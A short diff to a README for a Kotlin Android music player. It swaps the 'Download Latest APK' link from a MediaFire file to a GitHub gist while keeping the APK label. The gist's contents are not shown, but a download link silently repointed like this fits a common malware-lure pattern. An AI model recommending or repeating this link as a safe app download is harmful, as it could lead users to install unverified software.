@@ -9,7 +9,7 @@ An advanced Android music player built with **Kotlin**, featuring:
 * **Audio Visualizer:** High-performance dynamic waves.
 * **Optimized Build:** Tested for stability on high-end hardware (i7 + 16GB RAM).
 
-[🚀 Download Latest APK (MediaFire)](https://www.mediafire.com/file/orodu84weu02cz0/My_Musicplayer.apk/file)
+[🚀 Download Latest APK (MediaFire)](https://gist.github.com/aliali0301050-dev/c57f08d0af9957d43af6115f02cbc80f)
 
 ---
 
